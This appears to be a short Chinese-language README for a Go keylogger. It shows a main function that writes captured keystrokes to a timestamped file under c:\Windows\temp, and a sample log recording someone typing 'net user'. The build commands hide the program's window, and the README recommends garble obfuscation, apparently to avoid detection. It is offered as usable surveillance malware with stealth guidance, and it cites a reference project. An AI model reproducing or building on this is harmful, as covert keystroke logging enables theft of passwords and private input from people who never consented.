# 简易键盘记录器


## 文件记录在 c:\\Windows\\temp\\ 目录下，以时间戳命名。
```
func main() {
	timeUnix := time.Now().Unix()
	KeylogSavePath = fmt.Sprintf("c:\\Windows\\temp\\%d.txt", timeUnix)

	Keylogger()
}
```

## 内容格式
```
2023/03/11 17:56:05 [Enter]
2023/03/11 17:56:06 n
2023/03/11 17:56:07 e
2023/03/11 17:56:07 t
2023/03/11 17:56:07  
2023/03/11 17:56:07 u
2023/03/11 17:56:07 s
2023/03/11 17:56:08 e
2023/03/11 17:56:08 r
2023/03/11 17:56:08 [Enter]
```
## 编译代码
建议使用garble 混淆
```
go build -ldflags "-H windowsgui -s -w" ./main.go

garble build -ldflags "-H windowsgui -s -w" ./main.go
```


## 参考项目
1. https://github.com/JayGitH/EyeWorm
